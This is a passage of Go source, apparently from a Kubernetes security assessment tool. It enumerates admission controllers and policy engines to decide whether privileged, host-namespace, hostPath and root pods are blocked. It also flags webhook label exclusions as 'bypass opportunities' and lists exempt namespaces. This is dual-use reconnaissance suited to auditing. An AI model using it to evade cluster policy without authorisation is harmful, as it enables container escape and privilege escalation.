	info := PolarisConfigInfo{}

	// Check for Polaris webhook
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			// Polaris webhook is typically named "polaris-webhook" or contains "polaris"
			if strings.Contains(strings.ToLower(name), "polaris") {
				info.WebhookEnabled = true
				break
			}
		}
	}

	// Check for Polaris ConfigMap and parse enabled checks
	polarisNamespaces := []string{"polaris", "fairwinds", "kube-system"}
	for _, ns := range polarisNamespaces {
		cm, err := clientset.CoreV1().ConfigMaps(ns).Get(ctx, "polaris", metav1.GetOptions{})
		if err == nil {
			info.ConfigMap = cm.Name
			info.Namespace = ns

			// Parse the config.yaml to detect enabled checks
			if configData, ok := cm.Data["config.yaml"]; ok {
				info.ConfigContent = configData
				configLower := strings.ToLower(configData)

				// Check for privileged container check
				// Polaris checks: privilegedContainers, dangerousCapabilities, hostNetwork, hostPID, hostIPC, etc.
				if strings.Contains(configLower, "privilegedcontainers") &&
					!strings.Contains(configLower, "privilegedcontainers: ignore") {
					info.PrivilegedCheckEnabled = true
				}

				// HostNetwork check
				if strings.Contains(configLower, "hostnetworkset") &&
					!strings.Contains(configLower, "hostnetworkset: ignore") {
					info.HostNetworkCheckEnabled = true
				}

				// HostPID check
				if strings.Contains(configLower, "hostpidset") &&
					!strings.Contains(configLower, "hostpidset: ignore") {
					info.HostPIDCheckEnabled = true
				}

				// HostIPC check
				if strings.Contains(configLower, "hostipcset") &&
					!strings.Contains(configLower, "hostipcset: ignore") {
					info.HostIPCCheckEnabled = true
				}

				// Capabilities check
				if strings.Contains(configLower, "dangerouscapabilities") &&
					!strings.Contains(configLower, "dangerouscapabilities: ignore") {
					info.CapabilitiesCheckEnabled = true
				}

				// RunAsRoot check
				if strings.Contains(configLower, "runasrootallowed") &&
					!strings.Contains(configLower, "runasrootallowed: ignore") {
					info.RunAsRootCheckEnabled = true
				}

				// HostPath check (Polaris doesn't have this by default, but custom configs might)
				if strings.Contains(configLower, "hostpath") &&
					!strings.Contains(configLower, "hostpath: ignore") {
					info.HostPathCheckEnabled = true
				}
			} else {
				// If no config.yaml, assume default Polaris checks are enabled
				info.PrivilegedCheckEnabled = true
				info.HostNetworkCheckEnabled = true
				info.HostPIDCheckEnabled = true
				info.HostIPCCheckEnabled = true
				info.CapabilitiesCheckEnabled = true
				info.RunAsRootCheckEnabled = true
			}
			break
		}
	}

	// If webhook is enabled but no ConfigMap found, assume defaults
	if info.WebhookEnabled && info.ConfigMap == "" {
		info.PrivilegedCheckEnabled = true
		info.HostNetworkCheckEnabled = true
		info.HostPIDCheckEnabled = true
		info.HostIPCCheckEnabled = true
		info.CapabilitiesCheckEnabled = true
		info.RunAsRootCheckEnabled = true
	}

	// Verify Polaris controller pods by image to reduce false positives
	if info.WebhookEnabled || info.ConfigMap != "" {
		for _, ns := range []string{"polaris", "fairwinds", "kube-system"} {
			pods, err := clientset.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
			if err == nil {
				for _, pod := range pods.Items {
					if pod.Status.Phase == corev1.PodRunning {
						for _, container := range pod.Spec.Containers {
							if verifyPodAdmissionImage(container.Image, "polaris") {
								info.ImageVerified = true
								break
							}
						}
					}
					if info.ImageVerified {
						break
					}
				}
			}
			if info.ImageVerified {
				break
			}
		}
	}

	return info
}

// analyzeDatreeConfig analyzes Datree webhook configuration
func analyzeDatreeConfig(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) DatreeConfigInfo {
	info := DatreeConfigInfo{}

	// Check for Datree webhook
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			// Datree webhook is typically named "datree-webhook" or contains "datree"
			if strings.Contains(strings.ToLower(name), "datree") {
				info.WebhookEnabled = true
				info.WebhookName = name
				break
			}
		}
	}

	// Check for Datree ConfigMaps that contain policy configuration
	// Datree stores policies in ConfigMaps or via their SaaS platform
	datreeNamespaces := []string{"datree", "datree-system", "kube-system"}
	for _, ns := range datreeNamespaces {
		// Check for datree-policy ConfigMap
		cms, err := clientset.CoreV1().ConfigMaps(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}

		for _, cm := range cms.Items {
			cmName := strings.ToLower(cm.Name)
			if strings.Contains(cmName, "datree") || strings.Contains(cmName, "policy") {
				// Parse policy configuration
				for key, data := range cm.Data {
					if strings.Contains(key, "policy") || strings.Contains(key, "yaml") || strings.Contains(key, "json") {
						info.ConfigContent = data
						dataLower := strings.ToLower(data)

						// Datree built-in rules detection
						// https://hub.datree.io/built-in-rules

						// Privileged containers check
						if strings.Contains(dataLower, "privileged") ||
							strings.Contains(dataLower, "containers_incorrect_privileged_value_true") {
							info.PrivilegedCheckEnabled = true
						}

						// HostNetwork check
						if strings.Contains(dataLower, "hostnetwork") ||
							strings.Contains(dataLower, "containers_incorrect_hostnetwork_value_true") {
							info.HostNetworkCheckEnabled = true
						}

						// HostPID check
						if strings.Contains(dataLower, "hostpid") ||
							strings.Contains(dataLower, "containers_incorrect_hostpid_value_true") {
							info.HostPIDCheckEnabled = true
						}

						// HostIPC check
						if strings.Contains(dataLower, "hostipc") ||
							strings.Contains(dataLower, "containers_incorrect_hostipc_value_true") {
							info.HostIPCCheckEnabled = true
						}

						// Capabilities check
						if strings.Contains(dataLower, "capabilities") ||
							strings.Contains(dataLower, "containers_incorrect_capabilities") {
							info.CapabilitiesCheckEnabled = true
						}

						// RunAsRoot check
						if strings.Contains(dataLower, "runasnonroot") || strings.Contains(dataLower, "runasroot") ||
							strings.Contains(dataLower, "containers_incorrect_runasnonroot_value") {
							info.RunAsRootCheckEnabled = true
						}

						// HostPath check
						if strings.Contains(dataLower, "hostpath") ||
							strings.Contains(dataLower, "containers_incorrect_hostpath") {
							info.HostPathCheckEnabled = true
						}
					}
				}
			}
		}
	}

	// If webhook is enabled but no config found, assume Datree default rules are enabled
	// Datree enables most security checks by default
	if info.WebhookEnabled && info.ConfigContent == "" {
		info.PrivilegedCheckEnabled = true
		info.HostNetworkCheckEnabled = true
		info.HostPIDCheckEnabled = true
		info.HostIPCCheckEnabled = true
		info.CapabilitiesCheckEnabled = true
		info.RunAsRootCheckEnabled = true
		// Datree checks hostPath by default in its rules
		info.HostPathCheckEnabled = true
	}

	// Verify Datree controller pods by image to reduce false positives
	if info.WebhookEnabled {
		for _, ns := range []string{"datree", "datree-system", "kube-system"} {
			pods, err := clientset.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
			if err == nil {
				for _, pod := range pods.Items {
					if pod.Status.Phase == corev1.PodRunning {
						for _, container := range pod.Spec.Containers {
							if verifyPodAdmissionImage(container.Image, "datree") {
								info.ImageVerified = true
								break
							}
						}
					}
					if info.ImageVerified {
						break
					}
				}
			}
			if info.ImageVerified {
				break
			}
		}
	}

	return info
}

// analyzeGatekeeperMutation analyzes Gatekeeper mutation policies (Assign, AssignMetadata, ModifySet)
func analyzeGatekeeperMutation(ctx context.Context, dynClient dynamic.Interface) []GatekeeperMutationInfo {
	var mutations []GatekeeperMutationInfo

	mutationTypes := []struct {
		kind     string
		resource string
	}{
		{"Assign", "assign"},
		{"AssignMetadata", "assignmetadata"},
		{"ModifySet", "modifyset"},
	}

	for _, mt := range mutationTypes {
		gvr := schema.GroupVersionResource{
			Group:    "mutations.gatekeeper.sh",
			Version:  "v1",
			Resource: mt.resource,
		}

		list, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
		if err != nil {
			// Try v1beta1
			gvr.Version = "v1beta1"
			list, err = dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
			if err != nil {
				continue
			}
		}

		for _, item := range list.Items {
			info := GatekeeperMutationInfo{
				Name: item.GetName(),
				Kind: mt.kind,
			}

			// Get location (what's being mutated)
			if location, ok, _ := unstructured.NestedString(item.Object, "spec", "location"); ok {
				info.Location = location
			}

			// Get match info
			if match, ok, _ := unstructured.NestedMap(item.Object, "spec", "match"); ok {
				if kinds, ok := match["kinds"].([]interface{}); ok {
					info.Match = fmt.Sprintf("%d kind rules", len(kinds))
				}
			}

			mutations = append(mutations, info)
		}
	}

	return mutations
}

// analyzeWebhookSelectors analyzes webhook selectors for bypass opportunities
func analyzeWebhookSelectors(ctx context.Context, dynClient dynamic.Interface) []WebhookSelectorInfo {
	var selectors []WebhookSelectorInfo

	webhookTypes := []struct {
		resource string
		whType   string
	}{
		{"validatingwebhookconfigurations", "validating"},
		{"mutatingwebhookconfigurations", "mutating"},
	}

	for _, wt := range webhookTypes {
		gvr := schema.GroupVersionResource{
			Group:    "admissionregistration.k8s.io",
			Version:  "v1",
			Resource: wt.resource,
		}

		list, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}

		for _, item := range list.Items {
			webhooks, ok := item.Object["webhooks"].([]interface{})
			if !ok {
				continue
			}

			for _, wh := range webhooks {
				whMap, ok := wh.(map[string]interface{})
				if !ok {
					continue
				}

				info := WebhookSelectorInfo{
					WebhookName: item.GetName(),
					Type:        wt.whType,
				}

				// Check namespace selector
				if nsSelector, ok := whMap["namespaceSelector"].(map[string]interface{}); ok {
					// Check for matchExpressions with NotIn or DoesNotExist
					if matchExprs, ok := nsSelector["matchExpressions"].([]interface{}); ok {
						for _, expr := range matchExprs {
							if exprMap, ok := expr.(map[string]interface{}); ok {
								operator := exprMap["operator"]
								if operator == "NotIn" || operator == "DoesNotExist" {
									info.BypassMethod = "Namespace label exclusion"
									if key, ok := exprMap["key"].(string); ok {
										info.ExcludedLabels = append(info.ExcludedLabels, key)
									}
								}
							}
						}
					}
					// Check for matchLabels
					if matchLabels, ok := nsSelector["matchLabels"].(map[string]interface{}); ok {
						info.MatchLabels = make(map[string]string)
						for k, v := range matchLabels {
							if vStr, ok := v.(string); ok {
								info.MatchLabels[k] = vStr
							}
						}
					}
				}

				// Check object selector
				if objSelector, ok := whMap["objectSelector"].(map[string]interface{}); ok {
					if matchExprs, ok := objSelector["matchExpressions"].([]interface{}); ok {
						for _, expr := range matchExprs {
							if exprMap, ok := expr.(map[string]interface{}); ok {
								operator := exprMap["operator"]
								if operator == "NotIn" || operator == "DoesNotExist" {
									info.BypassMethod = "Object label exclusion"
									if key, ok := exprMap["key"].(string); ok {
										info.ExcludedLabels = append(info.ExcludedLabels, key)
									}
								}
							}
						}
					}
				}

				if info.BypassMethod != "" || len(info.ExcludedLabels) > 0 {
					selectors = append(selectors, info)
				}
			}
		}
	}

	return selectors
}

// analyzePSSExemptions analyzes PSS exemptions from cluster configuration
func analyzePSSExemptions(ctx context.Context, clientset kubernetes.Interface) PSSExemptionInfo {
	info := PSSExemptionInfo{}

	// PSS exemptions are typically configured in the API server's AdmissionConfiguration
	// We can detect some common patterns:
	// 1. Check for namespaces with pod-security.kubernetes.io/exempt label
	// 2. Check for common exempt namespaces (kube-system, kube-public, etc.)

	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	if err != nil {
		return info
	}

	for _, ns := range namespaces.Items {
		// Check for exempt annotation/label
		if exempt, ok := ns.Labels["pod-security.kubernetes.io/exempt"]; ok && exempt == "true" {
			info.ExemptNamespaces = append(info.ExemptNamespaces, ns.Name)
		}

		// Common system namespaces are often exempt
		if ns.Name == "kube-system" || ns.Name == "kube-public" || ns.Name == "kube-node-lease" {
			// Check if PSS is not configured (implicit exemption)
			if _, hasEnforce := ns.Labels["pod-security.kubernetes.io/enforce"]; !hasEnforce {
				// These namespaces often run privileged system pods
				// They may be exempt via AdmissionConfiguration
			}
		}
	}

	// Note: Full exemption analysis requires access to the API server's AdmissionConfiguration
	// which is typically not accessible via the API. The exemptions for users, groups,
	// and runtimeClasses are configured there.
	//
	// Common exempt users: system:serviceaccount:kube-system:*
	// Common exempt runtimeClasses: (cluster-specific)

	return info
}

// detectPolicyEngineBlocking analyzes policy engines for known blocking rules
// This prevents false positives when PSS/PSP aren't configured but policy engines enforce restrictions
func detectPolicyEngineBlocking(
	gatekeeperConstraints []GatekeeperConstraintInfo,
	kyvernoPolicies []KyvernoPolicyInfo,
	vapPolicies []ValidatingAdmissionPolicyInfo,
	kubewardenPolicies []KubewardenPolicyInfo,
	jsPolicies []JsPolicyInfo,
	polarisConfig PolarisConfigInfo,
	datreeConfig DatreeConfigInfo,
) PolicyEngineBlocking {
	blocking := PolicyEngineBlocking{}

	// Well-known Gatekeeper PSP-equivalent template kinds from gatekeeper-library
	// https://github.com/open-policy-agent/gatekeeper-library/tree/master/library/pod-security-policy
	gatekeeperPrivilegedKinds := []string{
		"k8spsprivilegedcontainer",
		"k8spspprivileged",
		"privilegedcontainer",
		"noprivileged",
		"disallowprivileged",
	}
	gatekeeperHostPathKinds := []string{
		"k8spsphostfilesystem",
		"k8spspallowedvolumes", // when hostPath is not in allowed list
		"hostfilesystem",
		"nohostpath",
		"disallowhostpath",
	}
	gatekeeperHostNetworkKinds := []string{
		"k8spsphostnetworkingports",
		"k8spsphostnetwork",
		"hostnetwork",
		"nohostnetwork",
		"disallowhostnetwork",
	}
	gatekeeperHostNamespaceKinds := []string{
		"k8spsphostnamespace",
		"hostnamespace",
		"nohostnamespace",
		"disallowhostnamespace",
		"hostpid",
		"hostipc",
	}
	gatekeeperCapabilitiesKinds := []string{
		"k8spspcapabilities",
		"capabilities",
		"restrictcapabilities",
		"dropcapabilities",
	}
	gatekeeperRunAsKinds := []string{
		"k8spspallowedusers",
		"k8spsprunasnonroot",
		"runasnonroot",
		"norunasroot",
		"mustrunasnonroot",
	}

	// Check Gatekeeper constraints by well-known template kinds AND Rego content
	for _, c := range gatekeeperConstraints {
		if c.EnforcementAction == "dryrun" || c.EnforcementAction == "warn" {
			continue // Only count enforcing policies
		}
		kind := strings.ToLower(c.Kind)
		name := strings.ToLower(c.Name)
		rego := strings.ToLower(c.RegoContent)
		combined := kind + " " + name

		// Check against well-known kinds AND Rego content for privileged
		privilegedDetected := false
		for _, k := range gatekeeperPrivilegedKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) ||
				(strings.Contains(combined, "privileged") && !strings.Contains(combined, "allowprivileged")) {
				privilegedDetected = true
				break
			}
		}
		// Also check Rego content for privileged patterns
		if !privilegedDetected && rego != "" {
			if (strings.Contains(rego, "securitycontext") && strings.Contains(rego, "privileged")) ||
				strings.Contains(rego, "input.review.object.spec.containers") && strings.Contains(rego, "privileged") {
				privilegedDetected = true
			}
		}
		if privilegedDetected {
			blocking.PrivilegedBlocked = true
			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// HostPath / Host filesystem - check kinds and Rego
		hostPathDetected := false
		for _, k := range gatekeeperHostPathKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) ||
				strings.Contains(combined, "hostpath") || strings.Contains(combined, "host-path") {
				hostPathDetected = true
				break
			}
		}
		if !hostPathDetected && rego != "" {
			if strings.Contains(rego, "hostpath") ||
				(strings.Contains(rego, "volumes") && strings.Contains(rego, "hostpath")) {
				hostPathDetected = true
			}
		}
		if hostPathDetected {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// HostNetwork - check kinds and Rego
		hostNetworkDetected := false
		for _, k := range gatekeeperHostNetworkKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) ||
				strings.Contains(combined, "hostnetwork") || strings.Contains(combined, "host-network") {
				hostNetworkDetected = true
				break
			}
		}
		if !hostNetworkDetected && rego != "" {
			if strings.Contains(rego, "hostnetwork") {
				hostNetworkDetected = true
			}
		}
		if hostNetworkDetected {
			blocking.HostNetworkBlocked = true
			blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// HostPID - check kinds and Rego
		hostPIDDetected := false
		for _, k := range gatekeeperHostNamespaceKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) ||
				strings.Contains(combined, "hostpid") || strings.Contains(combined, "host-pid") {
				hostPIDDetected = true
				break
			}
		}
		if !hostPIDDetected && rego != "" {
			if strings.Contains(rego, "hostpid") {
				hostPIDDetected = true
			}
		}
		if hostPIDDetected {
			blocking.HostPIDBlocked = true
			blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// HostIPC - check kinds and Rego
		hostIPCDetected := false
		for _, k := range gatekeeperHostNamespaceKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) ||
				strings.Contains(combined, "hostipc") || strings.Contains(combined, "host-ipc") {
				hostIPCDetected = true
				break
			}
		}
		if !hostIPCDetected && rego != "" {
			if strings.Contains(rego, "hostipc") {
				hostIPCDetected = true
			}
		}
		if hostIPCDetected {
			blocking.HostIPCBlocked = true
			blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// Capabilities - check kinds and Rego
		capsDetected := false
		for _, k := range gatekeeperCapabilitiesKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) {
				capsDetected = true
				break
			}
		}
		if !capsDetected && rego != "" {
			if strings.Contains(rego, "capabilities") ||
				(strings.Contains(rego, "securitycontext") && strings.Contains(rego, "add")) {
				capsDetected = true
			}
		}
		if capsDetected {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}

		// RunAsRoot / RunAsNonRoot - check kinds and Rego
		runAsRootDetected := false
		for _, k := range gatekeeperRunAsKinds {
			if strings.Contains(kind, k) || strings.Contains(name, k) {
				runAsRootDetected = true
				break
			}
		}
		if !runAsRootDetected && rego != "" {
			if strings.Contains(rego, "runasnonroot") || strings.Contains(rego, "runasuser") ||
				(strings.Contains(rego, "securitycontext") && strings.Contains(rego, "runasuser")) {
				runAsRootDetected = true
			}
		}
		if runAsRootDetected {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, fmt.Sprintf("Gatekeeper:%s/%s", c.Kind, c.Name))
		}
	}

	// Check Kyverno policies by rule names, patterns, AND validate content
	for _, p := range kyvernoPolicies {
		if p.ValidationFailure != "Enforce" && p.ValidationFailure != "enforce" {
			continue // Only count enforcing policies
		}
		name := strings.ToLower(p.Name)

		// Combine name, rule names, and validate patterns for comprehensive matching
		patternsContent := strings.ToLower(strings.Join(p.RulePatterns, " "))

		for _, rule := range p.RuleNames {
			ruleLower := strings.ToLower(rule)
			combined := name + " " + ruleLower + " " + patternsContent

			// Privileged containers - check names and validate patterns
			if (strings.Contains(combined, "privileged") && !strings.Contains(combined, "allow")) ||
				strings.Contains(patternsContent, "securitycontext") && strings.Contains(patternsContent, "privileged") {
				blocking.PrivilegedBlocked = true
				blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// HostPath volumes
			if strings.Contains(combined, "hostpath") || strings.Contains(combined, "host-path") ||
				(strings.Contains(patternsContent, "volumes") && strings.Contains(patternsContent, "hostpath")) {
				blocking.HostPathBlocked = true
				blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// HostNetwork
			if strings.Contains(combined, "hostnetwork") || strings.Contains(combined, "host-network") ||
				strings.Contains(patternsContent, "hostnetwork") {
				blocking.HostNetworkBlocked = true
				blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// HostPID
			if strings.Contains(combined, "hostpid") || strings.Contains(combined, "host-pid") ||
				strings.Contains(patternsContent, "hostpid") {
				blocking.HostPIDBlocked = true
				blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// HostIPC
			if strings.Contains(combined, "hostipc") || strings.Contains(combined, "host-ipc") ||
				strings.Contains(patternsContent, "hostipc") {
				blocking.HostIPCBlocked = true
				blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// Capabilities
			if strings.Contains(combined, "capabilities") ||
				(strings.Contains(patternsContent, "securitycontext") && strings.Contains(patternsContent, "capabilities")) {
				blocking.DangerousCapsBlocked = true
				blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}

			// RunAsNonRoot
			if strings.Contains(combined, "runasnonroot") || strings.Contains(combined, "run-as-non-root") ||
				strings.Contains(patternsContent, "runasnonroot") || strings.Contains(patternsContent, "runasuser") {
				blocking.RunAsRootBlocked = true
				blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, fmt.Sprintf("Kyverno:%s/%s", p.Name, rule))
			}
		}
	}

	// Check VAP by name patterns AND CEL expression content
	for _, v := range vapPolicies {
		if v.FailurePolicy != "Fail" {
			continue // Only count failing policies
		}
		name := strings.ToLower(v.Name)

		// Combine name and CEL expressions for pattern matching
		celContent := strings.ToLower(strings.Join(v.CELExpressions, " "))
		combined := name + " " + celContent

		// Privileged containers - check for securityContext.privileged patterns
		if (strings.Contains(combined, "privileged") && !strings.Contains(name, "allow")) ||
			strings.Contains(celContent, "securitycontext") && strings.Contains(celContent, "privileged") {
			blocking.PrivilegedBlocked = true
			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// HostPath volumes
		if strings.Contains(combined, "hostpath") || strings.Contains(combined, "host-path") ||
			(strings.Contains(celContent, "volumes") && strings.Contains(celContent, "hostpath")) {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// HostNetwork
		if strings.Contains(combined, "hostnetwork") || strings.Contains(combined, "host-network") ||
			strings.Contains(celContent, "hostnetwork") {
			blocking.HostNetworkBlocked = true
			blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// HostPID
		if strings.Contains(combined, "hostpid") || strings.Contains(combined, "host-pid") ||
			strings.Contains(celContent, "hostpid") {
			blocking.HostPIDBlocked = true
			blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// HostIPC
		if strings.Contains(combined, "hostipc") || strings.Contains(combined, "host-ipc") ||
			strings.Contains(celContent, "hostipc") {
			blocking.HostIPCBlocked = true
			blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// Capabilities
		if strings.Contains(combined, "capabilities") ||
			(strings.Contains(celContent, "securitycontext") && strings.Contains(celContent, "capabilities")) {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}

		// RunAsNonRoot
		if strings.Contains(celContent, "runasnonroot") || strings.Contains(celContent, "runasuser") {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, fmt.Sprintf("VAP:%s", v.Name))
		}
	}

	// Check Kubewarden policies by module names AND settings content
	// Well-known Kubewarden policy modules from https://github.com/kubewarden
	for _, p := range kubewardenPolicies {
		if p.Mode != "protect" {
			continue // Only count protecting policies
		}
		module := strings.ToLower(p.Module)
		name := strings.ToLower(p.Name)
		settings := strings.ToLower(p.Settings)
		combined := module + " " + name + " " + settings

		// Privileged - check module name and settings
		if strings.Contains(combined, "privileged") || strings.Contains(module, "pod-privileged") ||
			strings.Contains(settings, "allow_privileged") {
			blocking.PrivilegedBlocked = true
			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
		}

		// HostPath - check module name and settings
		if strings.Contains(combined, "hostpath") || strings.Contains(combined, "host-path") ||
			strings.Contains(module, "hostpaths") || strings.Contains(settings, "allowedhostpaths") {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
		}

		// Host namespaces - check module name and settings
		if strings.Contains(combined, "host-namespace") || strings.Contains(combined, "hostnamespace") ||
			strings.Contains(settings, "allow_host_network") || strings.Contains(settings, "allow_host_pid") ||
			strings.Contains(settings, "allow_host_ipc") {
			if strings.Contains(settings, "allow_host_network") || strings.Contains(module, "host-namespace") {
				blocking.HostNetworkBlocked = true
				blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
			}
			if strings.Contains(settings, "allow_host_pid") || strings.Contains(module, "host-namespace") {
				blocking.HostPIDBlocked = true
				blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
			}
			if strings.Contains(settings, "allow_host_ipc") || strings.Contains(module, "host-namespace") {
				blocking.HostIPCBlocked = true
				blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
			}
		}

		// Capabilities - check module name and settings
		if strings.Contains(combined, "capabilities") || strings.Contains(module, "capabilities-psp") ||
			strings.Contains(settings, "required_drop_capabilities") || strings.Contains(settings, "allowed_capabilities") {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
		}

		// RunAsRoot - check module name and settings
		if strings.Contains(combined, "user-group") || strings.Contains(module, "user-group-psp") ||
			strings.Contains(settings, "run_as_user") || strings.Contains(settings, "run_as_group") {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, fmt.Sprintf("Kubewarden:%s", p.Name))
		}
	}

	// Check jsPolicy policies by type, name patterns, AND JavaScript code content
	for _, p := range jsPolicies {
		if p.ViolationPolicy != "deny" && p.ViolationPolicy != "Deny" {
			continue // Only count denying policies
		}
		name := strings.ToLower(p.Name)
		jsCode := strings.ToLower(p.JavaScriptCode)
		combined := name + " " + jsCode

		// Privileged - check name and JS code
		if strings.Contains(combined, "privileged") ||
			(strings.Contains(jsCode, "securitycontext") && strings.Contains(jsCode, "privileged")) {
			blocking.PrivilegedBlocked = true
			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// HostPath - check name and JS code
		if strings.Contains(combined, "hostpath") || strings.Contains(combined, "host-path") ||
			(strings.Contains(jsCode, "volumes") && strings.Contains(jsCode, "hostpath")) {
			blocking.HostPathBlocked = true
			blocking.HostPathBlockedBy = append(blocking.HostPathBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// HostNetwork - check name and JS code
		if strings.Contains(combined, "hostnetwork") || strings.Contains(combined, "host-network") ||
			strings.Contains(jsCode, "hostnetwork") {
			blocking.HostNetworkBlocked = true
			blocking.HostNetworkBlockedBy = append(blocking.HostNetworkBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// HostPID - check name and JS code
		if strings.Contains(combined, "hostpid") || strings.Contains(combined, "host-pid") ||
			strings.Contains(combined, "hostnamespace") || strings.Contains(jsCode, "hostpid") {
			blocking.HostPIDBlocked = true
			blocking.HostPIDBlockedBy = append(blocking.HostPIDBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// HostIPC - check name and JS code
		if strings.Contains(combined, "hostipc") || strings.Contains(combined, "host-ipc") ||
			strings.Contains(combined, "hostnamespace") || strings.Contains(jsCode, "hostipc") {
			blocking.HostIPCBlocked = true
			blocking.HostIPCBlockedBy = append(blocking.HostIPCBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// Capabilities - check name and JS code
		if strings.Contains(combined, "capabilities") ||
			(strings.Contains(jsCode, "securitycontext") && strings.Contains(jsCode, "capabilities")) {
			blocking.DangerousCapsBlocked = true
			blocking.DangerousCapsBlockedBy = append(blocking.DangerousCapsBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}

		// RunAsNonRoot - check name and JS code
		if strings.Contains(combined, "runasnonroot") || strings.Contains(combined, "run-as-non-root") ||
			strings.Contains(jsCode, "runasnonroot") || strings.Contains(jsCode, "runasuser") {
			blocking.RunAsRootBlocked = true
			blocking.RunAsRootBlockedBy = append(blocking.RunAsRootBlockedBy, fmt.Sprintf("jsPolicy:%s", p.Name))
		}
	}

	// Check Polaris - use specific check configuration from ConfigMap
	// Polaris checks: https://polaris.docs.fairwinds.com/checks/security/
	if polarisConfig.WebhookEnabled {
		// Only mark as blocked if the specific check is enabled
		if polarisConfig.PrivilegedCheckEnabled {
			blocking.PrivilegedBlocked = true
			blocking.PrivilegedBlockedBy = append(blocking.PrivilegedBlockedBy, "Polaris:privilegedContainers")
		}
		if polarisConfig.HostNetworkCheckEnabled {
			blocking.HostNetworkBlocked = true
